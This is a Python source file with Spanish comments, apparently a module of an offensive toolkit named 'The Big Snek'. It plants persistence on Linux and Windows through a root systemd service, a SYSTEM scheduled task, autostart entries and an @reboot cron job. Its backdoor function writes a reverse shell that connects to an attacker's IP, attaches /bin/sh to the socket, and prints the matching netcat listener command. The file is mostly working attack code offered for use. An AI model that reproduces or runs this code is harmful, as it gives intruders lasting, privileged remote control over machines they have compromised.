#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Módulo de creación de persistencia y puertas traseras para Linux/Windows.
Uso: python persist.py --method systemd --command "python3 /path/to/backdoor.py"
"""

import sys
import os
import argparse
import platform
import subprocess
import stat

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.colors import Colors
from core.logger import Logger
from core.utils import Utils

class PersistenceManager:
    """Gestor de persistencia para sistemas Linux y Windows."""

    def __init__(self, command, method='systemd', verbose=False):
        self.command = command
        self.method = method.lower()
        self.verbose = verbose
        self.logger = Logger()
        self.utils = Utils()
        self.os_type = platform.system().lower()

    def create_systemd_service(self):
        """Crea un servicio systemd para persistencia."""
        if self.os_type != 'linux':
            self.logger.error("systemd solo está disponible en Linux")
            return False

        # Verificar si systemd está disponible
        try:
            subprocess.run(['systemctl', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            self.logger.error("systemd no está disponible en este sistema")
            return False

        service_name = input(f"{Colors.YELLOW}[*] Nombre del servicio (default: snek-persist): {Colors.RESET}") or "snek-persist"
        service_file = f"/etc/systemd/system/{service_name}.service"

        if os.path.exists(service_file):
            overwrite = input(f"{Colors.YELLOW}[?] El servicio ya existe. ¿Sobrescribir? (y/N): {Colors.RESET}")
            if overwrite.lower() != 'y':
                self.logger.info("Operación cancelada")
                return False

        # Crear archivo de servicio
        service_content = f"""
[Unit]
Description=The Big Snek Persistence Service
After=network.target

[Service]
Type=simple
ExecStart={self.command}
Restart=always
RestartSec=10
User=root
WorkingDirectory=/

[Install]
WantedBy=multi-user.target
"""

        try:
            with open(service_file, 'w') as f:
                f.write(service_content.strip())

            # Recargar systemd y habilitar servicio
            subprocess.run(['systemctl', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', 'enable', service_name], check=True)
            subprocess.run(['systemctl', 'start', service_name], check=True)

            print(f"{Colors.GREEN}[+] Servicio systemd creado: {service_name}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Comando: {self.command}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Verificar estado: systemctl status {service_name}{Colors.RESET}")
            return True

        except Exception as e:
            self.logger.error(f"Error creando servicio: {e}")
            return False

    def create_windows_scheduled_task(self):
        """Crea una tarea programada en Windows."""
        if self.os_type != 'windows':
            self.logger.error("Esta función solo está disponible en Windows")
            return False

        task_name = input(f"{Colors.YELLOW}[*] Nombre de la tarea (default: SnekPersist): {Colors.RESET}") or "SnekPersist"

        try:
            # Crear tarea programada que se ejecuta al iniciar sesión
            cmd = f'schtasks /create /tn "{task_name}" /tr "{self.command}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] Tarea programada creada: {task_name}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Comando: {self.command}{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] Verificar: schtasks /query /tn "{task_name}" /fo LIST{Colors.RESET}")
                return True
            else:
                self.logger.error(f"Error creando tarea: {result.stderr}")
                return False

        except Exception as e:
            self.logger.error(f"Error: {e}")
            return False

    def create_startup_entry(self):
        """Crea entrada en el directorio de inicio (multi-plataforma)."""
        if self.os_type == 'windows':
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        else:
            # Linux/macOS
            startup_dir = os.path.join(os.path.expanduser('~'), '.config', 'autostart')

        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir)

        if self.os_type == 'windows':
            # Crear acceso directo o script .bat
            script_path = os.path.join(startup_dir, 'snek_startup.bat')
            with open(script_path, 'w') as f:
                f.write(f'@echo off\n{self.command}\n')
            print(f"{Colors.GREEN}[+] Script de inicio creado: {script_path}{Colors.RESET}")
        else:
            # Crear archivo .desktop para Linux
            desktop_file = os.path.join(startup_dir, 'snek-persist.desktop')
            desktop_content = f"""
[Desktop Entry]
Type=Application
Name=The Big Snek
Exec={self.command}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            with open(desktop_file, 'w') as f:
                f.write(desktop_content.strip())
            os.chmod(desktop_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
            print(f"{Colors.GREEN}[+] Entrada de inicio creada: {desktop_file}{Colors.RESET}")

        return True

    def create_cron_job(self):
        """Crea un cron job (solo Linux)."""
        if self.os_type != 'linux':
            self.logger.error("Cron solo está disponible en Linux")
            return False

        cron_time = input(f"{Colors.YELLOW}[*] Expresión cron (default: @reboot): {Colors.RESET}") or "@reboot"
        cron_line = f"{cron_time} {self.command}\n"

        try:
            # Obtener crontab actual
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout

            # Verificar si ya existe
            if self.command in current_cron:
                self.logger.warning("El comando ya existe en el crontab")
                return True

            # Agregar nueva línea
            new_cron = current_cron + cron_line
            subprocess.run(['crontab', '-'], input=new_cron, text=True, check=True)

            print(f"{Colors.GREEN}[+] Cron job agregado: {cron_line.strip()}{Colors.RESET}")
            return True

        except Exception as e:
            self.logger.error(f"Error agregando cron job: {e}")
            return False

    def create_backdoor(self):
        """Crea una puerta trasera simple (reverse shell)."""
        print(f"{Colors.YELLOW}[*] Configurando puerta trasera...{Colors.RESET}")

        # Configurar reverse shell
        ip = input(f"{Colors.CYAN}[?] IP del atacante (default: {self.utils.get_local_ip()}): {Colors.RESET}") or self.utils.get_local_ip()
        port = input(f"{Colors.CYAN}[?] Puerto (default: 4444): {Colors.RESET}") or "4444"

        # Crear script de backdoor
        backdoor_code = f'''
import socket
import subprocess
import os
import sys

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{ip}", {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except:
        pass

if __name__ == "__main__":
    reverse_shell()
'''

        # Guardar script
        backdoor_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'backdoors')
        if not os.path.exists(backdoor_dir):
            os.makedirs(backdoor_dir)

        backdoor_file = os.path.join(backdoor_dir, 'snek_backdoor.py')
        with open(backdoor_file, 'w') as f:
            f.write(backdoor_code)

        os.chmod(backdoor_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)

        print(f"{Colors.GREEN}[+] Puerta trasera creada en: {backdoor_file}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Comando para ejecutar: python3 {backdoor_file}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Escucha: nc -lvnp {port}{Colors.RESET}")

        return backdoor_file

    def run(self):
        """Ejecuta el método de persistencia seleccionado."""
        methods = {
            'systemd': self.create_systemd_service,
            'schtasks': self.create_windows_scheduled_task,
            'startup': self.create_startup_entry,
            'cron': self.create_cron_job,
            'backdoor': self.create_backdoor
        }

        if self.method in methods:
            return methods[self.method]()
        else:
            self.logger.error(f"Método no soportado: {self.method}")
            return False

def main(args):
    """Función principal llamada por snek.py"""
    parser = argparse.ArgumentParser(description="Creación de persistencia y puertas traseras")
    parser.add_argument('-m', '--method', choices=['systemd', 'schtasks', 'startup', 'cron', 'backdoor'],
                       default='systemd', help="Método de persistencia")
    parser.add_argument('-c', '--command', help="Comando a ejecutar (requerido para systemd/schtasks/startup/cron)")
    parser.add_argument('-v', '--verbose', action='store_true', help="Modo verboso")

    if not args:
        parser.print_help()
        return

    try:
        parsed_args = parser.parse_args(args)
    except SystemExit:
        return

    # Verificar requisitos
    if parsed_args.method != 'backdoor' and not parsed_args.command:
        print(f"{Colors.RED}[!] Error: Se requiere --command para el método {parsed_args.method}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Ejemplo: --command 'python3 /path/to/script.py'{Colors.RESET}")
        return

    # Crear gestor y ejecutar
    manager = PersistenceManager(
        command=parsed_args.command,
        method=parsed_args.method,
        verbose=parsed_args.verbose
    )
    manager.run()

if __name__ == "__main__":
    main(sys.argv[1:])
